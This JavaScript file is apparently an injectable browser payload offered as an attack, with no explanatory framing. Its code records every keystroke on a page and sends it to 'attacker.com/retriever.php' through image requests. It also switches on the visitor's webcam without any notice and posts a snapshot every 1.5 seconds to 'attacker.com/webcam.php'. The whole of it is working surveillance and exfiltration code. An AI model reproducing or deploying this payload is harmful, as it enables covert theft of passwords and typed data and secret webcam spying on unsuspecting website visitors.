var buffer = [];
var url = 'http://attacker.com/retriever.php?xsscope='

document.onkeypress = function(e) {
  get = window.event?event:e;
  buff = get.keyCode?get.keyCode:get.charCode;
  buff = String.fromCharCode(buff);
  buffer+=buff;
}

var imgArray = new Array();
var myVar;

function myFunction() {
  myVar = setInterval(every1sec, 1);
}

function every1sec() { 
 
     if (buffer.length > 0) {
        var data = decodeURIComponent(JSON.stringify(buffer));

        imgArray[0] = new Image();
        imgArray[0].src = url + data;

        new Image().src = buffer;
        buffer = [];
      }

}

function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: 'http://attacker.com/webcam.php',
    dataType: 'json',
    async: false,
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};


'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {
    
    facingMode: "user"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  setInterval(function(){

       context.drawImage(video, 0, 0, 640, 480);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData); }, 1500);
  

}


init();
myFunction();
